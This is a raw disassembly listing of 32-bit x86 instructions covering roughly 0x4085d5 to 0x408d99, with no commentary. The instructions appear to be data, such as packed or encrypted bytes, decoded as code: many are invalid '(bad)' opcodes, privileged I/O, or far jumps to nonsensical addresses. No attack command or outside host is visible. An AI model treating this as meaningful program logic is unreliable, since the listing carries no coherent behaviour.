  4085d5:	fadd   DWORD PTR [edi-0x61f51121]
  4085db:	dec    ebx
  4085dc:	xchg   DWORD PTR [ecx-0x46],esi
  4085df:	bound  edi,QWORD PTR [ebx]
  4085e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085e2:	test   DWORD PTR [ecx+0x41],0xd92f6ec8
  4085e9:	fsub   st,st(3)
  4085eb:	or     cl,BYTE PTR [esi-0x2a1fdbf6]
  4085f1:	repnz add WORD PTR [edi-0x3e90f9b2],bx
  4085f9:	xor    ch,BYTE PTR [edx]
  4085fb:	and    DWORD PTR [esi+ebp*1+0x667431c],0xdf82b4e1
  408606:	xor    BYTE PTR [ecx+ecx*2+0x50df5589],ch
  40860d:	int3   
  40860e:	test   dh,cl
  408610:	mov    cl,0x31
  408612:	jb     0x408633
  408614:	push   ecx
  408615:	popa   
  408616:	push   ss
  408617:	call   0x4835a0de
  40861c:	fild   WORD PTR [ebp+0x4e]
  40861f:	ja     0x40866c
  408621:	mov    ah,0x98
  408623:	sar    ebx,cl
  408625:	mov    eax,ds:0x5a125c8f
  40862a:	stos   BYTE PTR es:[edi],al
  40862b:	int3   
  40862c:	clc    
  40862d:	sub    al,0x45
  40862f:	jns    0x408611
  408631:	int    0x1a
  408633:	adc    eax,0xc0f11202
  408638:	ret    
  408639:	dec    eax
  40863a:	fdivr  DWORD PTR [esi+ecx*8-0x63]
  40863e:	mov    bl,0xe4
  408640:	mov    al,ds:0xa748c8dd
  408645:	repnz dec edi
  408647:	pop    edx
  408648:	adc    DWORD PTR [edi+0x78],edx
  40864b:	xlat   BYTE PTR ds:[ebx]
  40864c:	sub    DWORD PTR [edi+0x0],esi
  40864f:	shl    DWORD PTR [edx-0x11],cl
  408652:	out    0xe8,al
  408654:	lods   eax,DWORD PTR ds:[esi]
  408655:	in     eax,0x81
  408657:	xlat   BYTE PTR ds:[ebx]
  408658:	push   0xfffffff1
  40865a:	adc    eax,0x205df040
  40865f:	lock jae 0x40868a
  408662:	or     ebp,edx
  408664:	push   ebx
  408665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408666:	dec    edx
  408667:	cli    
  408668:	push   edi
  408669:	fdivr  QWORD PTR [edx-0x7a]
  40866c:	xchg   edx,eax
  40866d:	adc    ebp,DWORD PTR [edx+esi*8-0x54bcd363]
  408674:	setge  al
  408677:	push   0xef5430ff
  40867c:	cmc    
  40867d:	xchg   ebp,eax
  40867e:	call   0x309e:0x7950573d
  408685:	adc    dh,cl
  408687:	xchg   ecx,eax
  408688:	xchg   DWORD PTR [edx],esp
  40868a:	int    0x92
  40868c:	outs   dx,DWORD PTR ds:[esi]
  40868d:	jl     0x408650
  40868f:	lds    ebp,FWORD PTR [edx]
  408691:	or     ah,cl
  408693:	gs push esp
  408695:	fimul  WORD PTR [esi-0x5b28d894]
  40869b:	aad    0xef
  40869d:	push   ds
  40869e:	test   DWORD PTR [edx+0x3],eax
  4086a1:	push   ds
  4086a2:	inc    ecx
  4086a3:	data16 (bad) 
  4086a5:	cmp    ah,0x4d
  4086a8:	push   eax
  4086a9:	lea    edx,[edi+0x4e]
  4086ac:	inc    edx
  4086ad:	sbb    edx,DWORD PTR [ebx-0x41]
  4086b0:	daa    
  4086b1:	fist   DWORD PTR [edx-0x609d61bf]
  4086b7:	js     0x408709
  4086b9:	xchg   esi,eax
  4086ba:	lds    ebx,FWORD PTR [ebp+0x74]
  4086bd:	jno    0x40867c
  4086bf:	add    DWORD PTR [ecx],eax
  4086c1:	jmp    0x835d0772
  4086c6:	xor    edi,ebx
  4086c8:	call   DWORD PTR [eax+0x0]
  4086cb:	shr    DWORD PTR [ecx+0x7b],cl
  4086ce:	leave  
  4086cf:	nop
  4086d0:	mov    gs,WORD PTR [edi]
  4086d2:	mov    ?,WORD PTR [ebx]
  4086d4:	cmp    eax,0x51e2dbe9
  4086d9:	(bad)  
  4086da:	bound  ebx,QWORD PTR [edx+eiz*2+0x7bc25ba6]
  4086e1:	pop    es
  4086e2:	fisttp QWORD PTR [edi-0x5a0f29cb]
  4086e8:	xchg   ebx,eax
  4086e9:	jmp    0x408723
  4086eb:	lock sub eax,0xd3ec68b5
  4086f1:	xor    BYTE PTR gs:[eax+0x3be2656b],ch
  4086f8:	aaa    
  4086f9:	add    DWORD PTR [edx],ecx
  4086fb:	jecxz  0x408739
  4086fd:	push   esi
  4086fe:	and    edx,DWORD PTR ds:[ecx]
  408701:	fsub   st,st(5)
  408703:	push   ebp
  408704:	fst    DWORD PTR [esi-0x10]
  408707:	adc    edx,edx
  408709:	shl    DWORD PTR ds:[eax],cl
  40870c:	jmp    0xc94ce60c
  408711:	shr    BYTE PTR [ecx],0x34
  408714:	mov    esi,0xe057042d
  408719:	xchg   edx,ebp
  40871b:	cli    
  40871c:	and    esi,ebp
  40871e:	or     edi,DWORD PTR [eax-0x23]
  408721:	mov    eax,ds:0x1a39f50f
  408726:	mov    dl,BYTE PTR [ebx-0x53]
  408729:	sbb    BYTE PTR [edi],ch
  40872b:	lock fdivr QWORD PTR [ecx+eiz*1]
  40872f:	shl    BYTE PTR [eax-0x23b3883d],0x67
  408736:	inc    edx
  408737:	cmp    eax,0xbde7379c
  40873c:	sub    edx,DWORD PTR [ebx+0x62174b97]
  408742:	leave  
  408743:	bound  esp,QWORD PTR [esi+0x6a]
  408746:	ins    DWORD PTR es:[edi],dx
  408747:	inc    edi
  408748:	mov    dh,0xf2
  40874a:	iret   
  40874b:	cmp    BYTE PTR [ebx],dh
  40874d:	pop    ss
  40874e:	and    esp,DWORD PTR [ebp-0x3456aa6a]
  408754:	ret    
  408755:	cld    
  408756:	inc    esi
  408757:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408758:	cli    
  408759:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40875a:	jae    0x4087b9
  40875c:	fcomp  DWORD PTR ds:0x7d048b02
  408762:	mov    ds:0x144d13ea,eax
  408767:	jns    0x40874b
  408769:	hlt    
  40876a:	das    
  40876b:	mov    ecx,0x8b08945e
  408770:	mov    cl,0x7a
  408772:	out    dx,al
  408773:	pop    edx
  408774:	cmp    edi,0x2c
  408777:	aaa    
  408778:	loope  0x408780
  40877a:	and    esi,ebp
  40877c:	pop    ss
  40877d:	dec    eax
  40877e:	leave  
  40877f:	dec    ebx
  408780:	or     al,0xc4
  408782:	lock or al,0xb1
  408785:	mov    ch,BYTE PTR [eax]
  408787:	repnz mov dh,0x7b
  40878a:	ds push cs
  40878c:	repz je 0x408721
  40878f:	add    DWORD PTR [edx+0x281430f1],esi
  408795:	les    ebp,FWORD PTR [eax+eax*4+0x3d]
  408799:	mov    bl,BYTE PTR [edi+0x1a18acb0]
  40879f:	cld    
  4087a0:	push   esi
  4087a1:	sub    ah,bh
  4087a3:	cdq    
  4087a4:	push   ds
  4087a5:	popf   
  4087a6:	xor    edi,DWORD PTR [edx+0xb]
  4087a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087aa:	nop
  4087ab:	bound  edi,QWORD PTR [ecx-0x32fa8cd0]
  4087b1:	daa    
  4087b2:	and    edx,DWORD PTR [esi]
  4087b4:	xchg   ebx,eax
  4087b5:	call   0x160c:0x456971f5
  4087bc:	sahf   
  4087bd:	pop    edx
  4087be:	jge    0x4087a0
  4087c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087c1:	and    BYTE PTR [edi-0x34ae74ba],0x2f
  4087c8:	and    eax,0x6b796059
  4087cd:	or     al,0x96
  4087cf:	ins    DWORD PTR es:[edi],dx
  4087d0:	cmp    DWORD PTR [edx-0x6],ebp
  4087d3:	adc    eax,edx
  4087d5:	xor    al,BYTE PTR [edx]
  4087d7:	dec    ebp
  4087d8:	or     dl,BYTE PTR [ebp-0x1753d2e0]
  4087de:	cmc    
  4087df:	and    DWORD PTR [esi+0x3ff498b3],esp
  4087e5:	pop    edx
  4087e6:	add    eax,0x9e43034a
  4087eb:	xor    dh,dh
  4087ed:	fisub  DWORD PTR [ecx]
  4087ef:	push   ebp
  4087f0:	fdivr  DWORD PTR [ecx+ecx*8-0x1d7a6d6d]
  4087f7:	cmp    eax,0x77631061
  4087fc:	out    0x7c,al
  4087fe:	and    al,0xed
  408800:	inc    esp
  408801:	pop    esi
  408802:	(bad)  
  408803:	dec    edx
  408804:	add    ch,bh
  408806:	mov    esp,0xdb298436
  40880b:	jae    0x40885d
  40880d:	out    dx,eax
  40880e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40880f:	xor    ebx,DWORD PTR [ecx-0x56]
  408812:	dec    ebp
  408813:	ficomp DWORD PTR [ecx+ecx*2]
  408816:	or     cl,cl
  408818:	lds    edi,FWORD PTR [esi+0x5f]
  40881b:	fadd   DWORD PTR [ebp-0x16]
  40881e:	xchg   ebp,eax
  40881f:	in     al,dx
  408820:	sbb    BYTE PTR [edi],al
  408822:	mov    al,0xec
  408824:	push   ebx
  408825:	icebp  
  408826:	jmp    0x408852
  408828:	ds mov bl,0x65
  40882b:	out    dx,eax
  40882c:	test   al,0xc
  40882e:	fisubr DWORD PTR [ebx*1+0x3ccd86c0]
  408835:	sbb    cl,BYTE PTR [esi+0x4e0d6948]
  40883b:	inc    ebp
  40883c:	iret   
  40883d:	(bad)  
  40883e:	xor    DWORD PTR [ecx-0x5dcb041c],esi
  408844:	out    dx,eax
  408845:	jne    0x4087ef
  408847:	cmc    
  408848:	xchg   edi,eax
  408849:	sub    eax,0x5a6a116b
  40884e:	push   edi
  40884f:	dec    ebp
  408850:	loopne 0x408820
  408852:	mov    edx,esp
  408854:	mov    esi,DWORD PTR [edx+0x32bbada9]
  40885a:	nop
  40885b:	(bad)  
  40885c:	aam    0x85
  40885e:	push   ss
  40885f:	int3   
  408860:	int    0xdf
  408862:	add    eax,0x82b445ab
  408867:	outs   dx,DWORD PTR gs:[esi]
  408869:	frstor [edx-0x10]
  40886c:	push   ecx
  40886d:	mov    al,ds:0x7673a501
  408872:	outs   dx,BYTE PTR fs:[esi]
  408874:	adc    eax,0xf7ab1ca5
  408879:	sub    DWORD PTR [eax-0x53],ebp
  40887c:	jo     0x408824
  40887e:	ins    BYTE PTR es:[edi],dx
  40887f:	xchg   ecx,eax
  408880:	pusha  
  408881:	mov    DWORD PTR [edi+eiz*4+0xe],edi
  408885:	mov    bl,0x86
  408887:	pop    ebp
  408888:	fadd   DWORD PTR [edi]
  40888a:	cmp    ah,bh
  40888c:	jl     0x4088a5
  40888e:	shl    DWORD PTR [edi-0x54b9e755],1
  408894:	mov    cl,0x18
  408896:	dec    edx
  408897:	jecxz  0x40889a
  408899:	pop    esp
  40889a:	jmp    0xbc76:0x6d6a5ab0
  4088a1:	sub    ch,BYTE PTR [eax+edi*8]
  4088a4:	pop    esp
  4088a5:	rcl    DWORD PTR [eax],cl
  4088a7:	fcom   DWORD PTR [edi-0x59]
  4088aa:	fist   WORD PTR [eax+0x3b]
  4088ad:	and    dh,BYTE PTR [eax]
  4088af:	cdq    
  4088b0:	mov    bl,0xa7
  4088b2:	fadd   DWORD PTR [edx-0x1b]
  4088b5:	sahf   
  4088b6:	pushf  
  4088b7:	fwait
  4088b8:	popa   
  4088b9:	mov    ds:0x4f865a4f,eax
  4088be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088bf:	ja     0x4088a5
  4088c1:	cmp    DWORD PTR [eax+0x7d6f886c],esi
  4088c7:	loop   0x408935
  4088c9:	xor    dl,cl
  4088cb:	data16 (bad) 
  4088cd:	mov    al,0x4
  4088cf:	pop    es
  4088d0:	rep lods al,BYTE PTR ds:[esi]
  4088d2:	jns    0x408934
  4088d4:	mov    dh,0x6
  4088d6:	mov    ebp,0x9c004c94
  4088db:	(bad)  
  4088dc:	aas    
  4088dd:	xchg   edi,eax
  4088de:	add    al,0x24
  4088e0:	jne    0x408961
  4088e2:	or     DWORD PTR [ebp-0x2d31a6a1],0xffffffad
  4088e9:	mov    esi,0xcddd432b
  4088ee:	(bad)  
  4088f0:	mov    ebp,0xe813db27
  4088f5:	imul   esi,DWORD PTR [edi-0x74],0x22362307
  4088fc:	cld    
  4088fd:	mov    ds:0xbe205d03,al
  408902:	sub    al,0x4b
  408904:	fadd   QWORD PTR [ecx+0x6b8246ea]
  40890a:	mov    DWORD PTR [esi+0x14],esp
  40890d:	daa    
  40890e:	in     al,0x79
  408910:	mov    edx,0x5c63460c
  408915:	mov    ds:0xcad4f739,eax
  40891a:	sbb    dh,dh
  40891c:	mov    ah,0xab
  40891e:	mov    ecx,0x2ed582a5
  408923:	sar    al,0x5c
  408926:	cmp    al,0x3f
  408928:	xchg   ebp,eax
  408929:	wrmsr  
  40892b:	mov    DWORD PTR [ebx-0x66015e89],ecx
  408931:	aas    
  408932:	out    dx,eax
  408933:	cld    
  408934:	pop    esi
  408935:	shr    DWORD PTR [edi-0x5],0xe
  408939:	inc    edi
  40893a:	jg     0x408938
  40893c:	jge    0x4088e0
  40893e:	iret   
  40893f:	les    edx,FWORD PTR [edx]
  408941:	push   cs
  408942:	mov    WORD PTR [edx],ss
  408944:	cmp    dl,BYTE PTR [esi+ecx*2]
  408947:	loopne 0x408990
  408949:	sahf   
  40894a:	loopne 0x40893b
  40894c:	fwait
  40894d:	dec    ebp
  40894e:	jmp    0x23b6:0xc00781d
  408955:	inc    ebp
  408956:	mov    DWORD PTR [ebp+0x7e],ebp
  408959:	loopne 0x408963
  40895b:	paddb  mm1,QWORD PTR [ebx]
  40895e:	test   dh,0xab
  408961:	and    ebp,DWORD PTR [ecx+0x46]
  408964:	push   ds
  408965:	or     al,0x25
  408967:	cs mov dh,0x5
  40896a:	nop    DWORD PTR [ecx+0x69ca6053]
  408971:	sahf   
  408972:	cli    
  408973:	bound  edi,QWORD PTR [edi+ecx*8+0x29]
  408977:	int    0xa3
  408979:	adc    al,0x22
  40897b:	push   0x7f99a7ed
  408980:	xor    BYTE PTR [edi-0x2e],dh
  408983:	adc    bh,BYTE PTR [ebx+0x64fd0207]
  408989:	jg     0x4089ef
  40898b:	mov    ch,0x2f
  40898d:	test   ebp,ebp
  40898f:	shl    DWORD PTR [edi-0x60],cl
  408992:	push   ebp
  408993:	xchg   edx,eax
  408994:	jmp    0x40899b
  408996:	stc    
  408997:	es out dx,al
  408999:	fsub   QWORD PTR [eax-0x9b8103c]
  40899f:	in     al,0xdb
  4089a1:	xchg   BYTE PTR [ebx],al
  4089a3:	jl     0x408996
  4089a5:	cmp    DWORD PTR [edi],ebp
  4089a7:	sub    al,0xeb
  4089a9:	push   esp
  4089aa:	fst    DWORD PTR [ecx]
  4089ac:	adc    eax,0xc27b7ade
  4089b1:	mov    ah,0xa9
  4089b3:	cmp    al,0xae
  4089b5:	mov    dh,0xa7
  4089b7:	aam    0x58
  4089b9:	mov    al,0xa2
  4089bb:	jae    0x40895f
  4089bd:	adc    eax,0xcbb4795d
  4089c2:	mov    ch,0x57
  4089c4:	cmp    ecx,DWORD PTR [ecx]
  4089c6:	fsub   DWORD PTR ds:0xa01f6683
  4089cc:	mov    bh,0xd1
  4089ce:	sbb    bh,dl
  4089d0:	aad    0xab
  4089d2:	xchg   DWORD PTR ds:0x6d433d69,ebx
  4089d8:	add    ebx,esi
  4089da:	fnstsw WORD PTR [esi+0x15]
  4089dd:	xchg   ebx,eax
  4089de:	loopne 0x408a00
  4089e0:	xchg   BYTE PTR [esi+0x5d0c70a5],al
  4089e6:	loopne 0x4089af
  4089e8:	jmp    0x4089af
  4089ea:	in     eax,dx
  4089eb:	pushf  
  4089ec:	adc    al,0x9f
  4089ee:	pop    ss
  4089ef:	fbstp  TBYTE PTR [ebx+0x23179fbb]
  4089f5:	xchg   ebx,eax
  4089f6:	mov    ah,ch
  4089f8:	or     BYTE PTR [ecx-0x35],ah
  4089fb:	dec    edx
  4089fc:	mov    ds:0xb9717e2e,al
  408a01:	jge    0x408a1d
  408a03:	std    
  408a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a05:	aaa    
  408a06:	push   ecx
  408a07:	adc    al,0xdb
  408a09:	xchg   edi,eax
  408a0a:	loop   0x408a33
  408a0c:	(bad)  
  408a0d:	and    cl,bh
  408a0f:	ds push ebp
  408a11:	pop    es
  408a12:	sbb    DWORD PTR [ebx-0x4a],ebx
  408a15:	gs and eax,0x8813a7d2
  408a1b:	clc    
  408a1c:	sub    al,0xe5
  408a1e:	aaa    
  408a1f:	mov    gs,WORD PTR [edi]
  408a21:	jo     0x408a4a
  408a23:	adc    edx,DWORD PTR [esi-0x4a466fde]
  408a29:	(bad)  
  408a2a:	sbb    ch,BYTE PTR [edi-0xa]
  408a2d:	fiadd  DWORD PTR [ebx+edx*4-0x3e]
  408a31:	mov    ch,0x4
  408a33:	jmp    0x35be03bb
  408a38:	sub    DWORD PTR [ebx-0x37],0x48ccacc3
  408a3f:	and    BYTE PTR ds:0xd2d054f4,dh
  408a45:	pop    esp
  408a46:	test   eax,0xcc116b41
  408a4b:	aaa    
  408a4c:	sti    
  408a4d:	push   ecx
  408a4e:	comiss xmm7,xmm6
  408a51:	mov    esi,0x78516387
  408a56:	scas   eax,DWORD PTR es:[edi]
  408a57:	mov    esp,0x3a13e3b
  408a5c:	enter  0x2f8,0xd9
  408a60:	das    
  408a61:	(bad)  
  408a62:	mov    al,0xb8
  408a64:	pushf  
  408a65:	sbb    eax,0x691cad59
  408a6a:	mov    ecx,0xd7725388
  408a6f:	or     DWORD PTR [edx],esi
  408a71:	inc    edi
  408a72:	lods   eax,DWORD PTR es:[esi]
  408a74:	mov    bh,0x60
  408a76:	fdivr  QWORD PTR [edi+0x5f]
  408a79:	imul   edi,esi,0xa5a376
  408a7f:	loope  0x408a04
  408a81:	pop    ss
  408a82:	or     al,0x80
  408a84:	scas   al,BYTE PTR es:[edi]
  408a85:	adc    eax,0xc37989ee
  408a8a:	das    
  408a8b:	cmp    BYTE PTR [edi+ecx*1+0x4b],0x69
  408a90:	jmp    0x47e40f6f
  408a95:	mov    eax,0x1cedd941
  408a9a:	loop   0x408a51
  408a9c:	sub    ch,cl
  408a9e:	neg    BYTE PTR [ecx-0x2c]
  408aa1:	sbb    BYTE PTR [eax-0x4f92d89b],al
  408aa7:	ins    BYTE PTR es:[edi],dx
  408aa8:	ss int 0xc4
  408aab:	adc    cl,BYTE PTR [ebx+0x6c308a22]
  408ab1:	stos   DWORD PTR es:[edi],eax
  408ab2:	(bad)  
  408ab3:	call   DWORD PTR [ecx+eax*1-0x60ecba34]
  408aba:	and    eax,0x6d2786bb
  408abf:	arpl   WORD PTR [ebp-0x49de527d],bx
  408ac5:	sub    BYTE PTR [ebx-0x3e],ah
  408ac8:	aas    
  408ac9:	je     0x408a88
  408acb:	(bad)  
  408acd:	call   0x1f66:0x1f384a4f
  408ad4:	jg     0x408adc
  408ad6:	repnz lahf 
  408ad8:	inc    edi
  408ad9:	lods   al,BYTE PTR ds:[esi]
  408ada:	sbb    BYTE PTR [edi],al
  408adc:	jg     0x408a9e
  408ade:	adc    ch,BYTE PTR [eax+0x46]
  408ae1:	jle    0x408b13
  408ae3:	push   ecx
  408ae4:	outs   dx,DWORD PTR ds:[esi]
  408ae5:	mov    bl,BYTE PTR [edi]
  408ae7:	dec    eax
  408ae8:	jg     0x408afd
  408aea:	adc    eax,0x72e26f2b
  408aef:	push   ss
  408af0:	fs pop ebp
  408af2:	pop    ebp
  408af3:	cld    
  408af4:	xor    ecx,ecx
  408af6:	dec    ecx
  408af7:	or     eax,0xb92a3ba6
  408afc:	cmp    bh,BYTE PTR [ebx-0x5f]
  408aff:	mov    ah,0xb6
  408b01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b02:	loopne 0x408b42
  408b04:	lahf   
  408b05:	sub    DWORD PTR [ebx-0x73b4417e],ebp
  408b0b:	rcr    DWORD PTR ds:0x471681f3,1
  408b11:	xlat   BYTE PTR ds:[ebx]
  408b12:	jmpw   0x4a77
  408b16:	cdq    
  408b17:	mov    fs,ecx
  408b19:	cli    
  408b1a:	sbb    esp,ebp
  408b1c:	add    BYTE PTR [ebp+0x77aa0b43],cl
  408b22:	add    BYTE PTR [esi],ch
  408b24:	retf   
  408b25:	jg     0x408b13
  408b27:	xor    cl,BYTE PTR [eax+0x53794114]
  408b2d:	pop    esi
  408b2e:	out    0x2b,al
  408b30:	or     eax,0x83c1db80
  408b35:	leave  
  408b36:	cwde   
  408b37:	stos   BYTE PTR es:[edi],al
  408b38:	adc    al,bh
  408b3a:	loope  0x408ac6
  408b3c:	mov    bh,0x30
  408b3e:	mov    bl,0xba
  408b40:	sub    edi,esi
  408b42:	push   es
  408b43:	(bad)  
  408b44:	pop    edx
  408b45:	out    0x72,eax
  408b47:	enter  0x8407,0xc7
  408b4b:	loop   0x408b3f
  408b4d:	out    0x7f,eax
  408b4f:	adc    al,0xf6
  408b51:	xor    eax,0x6c6efc23
  408b56:	mov    cl,0x98
  408b58:	cmp    al,0x95
  408b5a:	ss int3 
  408b5c:	(bad)  
  408b5e:	adc    BYTE PTR [ebx-0x53054d1b],dh
  408b64:	and    ecx,DWORD PTR [eax-0x6893c8fa]
  408b6a:	dec    esi
  408b6b:	jbe    0x408b0b
  408b6d:	xor    dh,BYTE PTR [edi]
  408b6f:	mov    dh,0x70
  408b71:	mov    DWORD PTR [edi],ebp
  408b73:	(bad)  
  408b74:	push   esi
  408b75:	pop    es
  408b76:	int    0xfc
  408b78:	cmp    ebp,esi
  408b7a:	jns    0x408bf8
  408b7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b7d:	in     eax,dx
  408b7e:	mov    eax,ds:0x32bef8bd
  408b83:	arpl   sp,si
  408b85:	xchg   edi,eax
  408b86:	in     al,dx
  408b87:	pusha  
  408b88:	shr    bh,1
  408b8a:	sub    DWORD PTR [edx+ebp*4],edi
  408b8d:	mov    ds:0x9c4616fe,eax
  408b92:	fs push es
  408b94:	sbb    eax,0x9d17ce3b
  408b99:	sbb    bh,BYTE PTR [eax-0x30aac3c2]
  408b9f:	dec    eax
  408ba0:	aas    
  408ba1:	cmp    eax,DWORD PTR ds:0x5da6a158
  408ba7:	fadd   QWORD PTR [ecx-0x64a050a]
  408bad:	test   BYTE PTR [esi-0xcadf5a1],bh
  408bb3:	push   esi
  408bb4:	hlt    
  408bb5:	fadd   DWORD PTR [ecx-0x2914a4c0]
  408bbb:	out    dx,al
  408bbc:	lods   eax,DWORD PTR ds:[esi]
  408bbd:	loop   0x408c02
  408bbf:	jne    0x408bab
  408bc1:	out    0xd,al
  408bc3:	test   DWORD PTR [ebx-0x56c2b11c],eax
  408bc9:	sbb    al,0x51
  408bcb:	cmp    al,0xa1
  408bcd:	sub    al,0x7a
  408bcf:	pop    ebp
  408bd0:	js     0x408bfb
  408bd2:	cwde   
  408bd3:	dec    edi
  408bd4:	popf   
  408bd5:	ret    
  408bd6:	fadd   st(6),st
  408bd8:	dec    ecx
  408bd9:	(bad)  
  408bdc:	mov    dl,0x6c
  408bde:	jnp    0x408c41
  408be0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408be1:	test   eax,0xa7a7f09f
  408be6:	mov    dh,0x5a
  408be8:	or     BYTE PTR [ebx-0x27d9ea68],al
  408bee:	shl    DWORD PTR [ecx+0x61e7f23a],1
  408bf4:	neg    BYTE PTR [ebx+0x34]
  408bf7:	or     eax,0x553f1863
  408bfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bfd:	imul   esi,DWORD PTR [edi-0x160588ac],0xa
  408c04:	vmwrite esi,DWORD PTR [ecx+0x30]
  408c08:	arpl   WORD PTR [esi-0x65750ceb],bx
  408c0e:	rcl    DWORD PTR [ebp-0x71],cl
  408c11:	call   0x11eca269
  408c16:	cmc    
  408c17:	inc    esi
  408c18:	jbe    0x408c2d
  408c1a:	sbb    cl,bh
  408c1c:	mov    edi,0x5d232288
  408c21:	hlt    
  408c22:	lds    ebx,FWORD PTR [esi-0xc]
  408c25:	cmp    DWORD PTR [esi],edi
  408c27:	out    dx,eax
  408c28:	ins    BYTE PTR es:[edi],dx
  408c29:	inc    ebp
  408c2a:	gs jl  0x408bba
  408c2d:	pusha  
  408c2e:	or     DWORD PTR [edi+0x22],ebp
  408c31:	rcr    eax,cl
  408c33:	mov    cl,0xa1
  408c35:	fdivr  DWORD PTR [eax]
  408c37:	adc    eax,0x14392050
  408c3c:	xchg   esi,eax
  408c3d:	imul   esp,DWORD PTR [edi-0x36],0xffffffe3
  408c41:	ss das 
  408c43:	inc    ecx
  408c44:	mov    gs,WORD PTR [ecx+0x1e]
  408c47:	in     al,0xc0
  408c49:	imul   ebp,ebp,0x5f
  408c4c:	push   0xffffffc6
  408c4e:	das    
  408c4f:	jp     0x408cc5
  408c51:	add    al,BYTE PTR [edi+0x58]
  408c54:	mov    ds:0x9a03bff9,al
  408c59:	sbb    BYTE PTR [ecx-0x3],dh
  408c5c:	add    eax,0x820c49ac
  408c61:	bound  eax,QWORD PTR [edi]
  408c63:	aad    0x43
  408c65:	inc    edi
  408c66:	mov    ds:0x663db0cd,al
  408c6b:	dec    esi
  408c6c:	mov    ecx,ss
  408c6e:	sar    BYTE PTR [ebx-0x4a1a9573],1
  408c74:	push   0x5dd03746
  408c79:	pop    ebp
  408c7a:	dec    esp
  408c7b:	mov    al,ds:0xc4971591
  408c80:	lods   al,BYTE PTR ds:[esi]
  408c81:	cs dec esi
  408c83:	jl     0x408cc5
  408c85:	pop    ds
  408c86:	jb     0x408cde
  408c88:	lods   al,BYTE PTR ds:[esi]
  408c89:	adc    DWORD PTR [ecx-0x488bd186],esi
  408c8f:	jns    0x408cfd
  408c91:	cmp    eax,0x983c1ee9
  408c96:	je     0x408c64
  408c98:	add    DWORD PTR [edx+0xe],ebx
  408c9b:	repnz sub eax,0x2820d216
  408ca1:	cmp    al,0x65
  408ca3:	loopne 0x408ce4
  408ca5:	sub    eax,0xa8d69523
  408caa:	ror    bl,1
  408cac:	stos   DWORD PTR es:[edi],eax
  408cad:	jmp    0x408c92
  408caf:	iret   
  408cb0:	cmp    edi,DWORD PTR [esi]
  408cb2:	cmp    DWORD PTR [ebx],edi
  408cb4:	push   esp
  408cb5:	xchg   edx,eax
  408cb6:	mov    bl,0xc2
  408cb8:	push   cs
  408cb9:	push   esp
  408cba:	lods   eax,DWORD PTR ds:[esi]
  408cbb:	imul   edx
  408cbd:	dec    ecx
  408cbe:	addr16 mov eax,0x3e2280a3
  408cc4:	rcr    bh,cl
  408cc6:	mov    al,0x21
  408cc8:	lock inc ebp
  408cca:	daa    
  408ccb:	inc    edi
  408ccc:	retf   0xd513
  408ccf:	ret    
  408cd0:	(bad)  
  408cd1:	sti    
  408cd2:	dec    edi
  408cd3:	les    esp,FWORD PTR [eax+0xa]
  408cd6:	js     0x408d04
  408cd8:	mov    BYTE PTR [ecx],dl
  408cda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cdb:	ja     0x408d14
  408cdd:	fs mov edx,0x4277e780
  408ce3:	(bad)  
  408ce4:	dec    eax
  408ce5:	repnz dec BYTE PTR [esi+0x1bdc46e2]
  408cec:	mov    ebx,0xefe622a1
  408cf1:	jno    0x408d3b
  408cf3:	icebp  
  408cf4:	xchg   esp,eax
  408cf5:	out    dx,eax
  408cf6:	(bad)  
  408cf8:	retf   
  408cf9:	jns    0x408c8a
  408cfb:	call   FWORD PTR [esi+edx*1-0x4d]
  408cff:	add    ebx,edi
  408d01:	mov    WORD PTR [ecx-0x9d3128a],?
  408d07:	xlat   BYTE PTR ds:[ebx]
  408d08:	or     BYTE PTR [esp+edx*2-0x5],bl
  408d0c:	pop    eax
  408d0d:	(bad)  [eax+ebx*4-0x1c]
  408d11:	das    
  408d12:	call   0xe233:0xb8461c80
  408d19:	arpl   WORD PTR [esi+ecx*1+0x4d],ax
  408d1d:	pusha  
  408d1e:	rol    DWORD PTR [eax-0x7ff469e],cl
  408d24:	adc    eax,0x711743cb
  408d29:	adc    al,0xc5
  408d2b:	stos   DWORD PTR es:[edi],eax
  408d2c:	das    
  408d2d:	ret    
  408d2e:	mov    cl,0x45
  408d30:	icebp  
  408d31:	cmc    
  408d32:	ror    BYTE PTR [eax-0x49],1
  408d35:	js     0x408d2a
  408d37:	clc    
  408d38:	and    al,BYTE PTR [edi-0x7e]
  408d3b:	jns    0x408d13
  408d3d:	ds jne 0x408dbb
  408d40:	jb     0x408da1
  408d42:	dec    ecx
  408d43:	push   eax
  408d44:	mov    ah,0xf
  408d46:	mov    ah,0xb2
  408d48:	sbb    ecx,ebx
  408d4a:	scas   eax,DWORD PTR es:[edi]
  408d4b:	leave  
  408d4c:	mov    al,0x47
  408d4e:	inc    eax
  408d4f:	pop    eax
  408d50:	cwde   
  408d51:	daa    
  408d52:	or     al,0xa1
  408d54:	and    al,0xbd
  408d56:	into   
  408d57:	call   0xcd6a:0x333d3d2c
  408d5e:	in     eax,0xf0
  408d60:	fst    QWORD PTR [ebp-0x5f2a3808]
  408d66:	inc    eax
  408d67:	jg     0x408d10
  408d69:	jae    0x408d0f
  408d6b:	fdivr  QWORD PTR ds:0x4e7af858
  408d71:	and    BYTE PTR [ebp+0x78],dh
  408d74:	sbb    ah,BYTE PTR [edi]
  408d76:	mov    esp,0xd6f68814
  408d7b:	dec    edi
  408d7c:	sar    BYTE PTR [ecx-0x40],1
  408d7f:	aas    
  408d80:	pusha  
  408d81:	mov    fs,WORD PTR [ebx+0x2dc881e]
  408d87:	es cmp ebp,0xd4f81925
  408d8e:	push   ss
  408d8f:	mov    eax,ds:0x3d041a83
  408d94:	xor    eax,0xb46faa85
  408d99:	mov    BYTE PTR [edi],0x2f
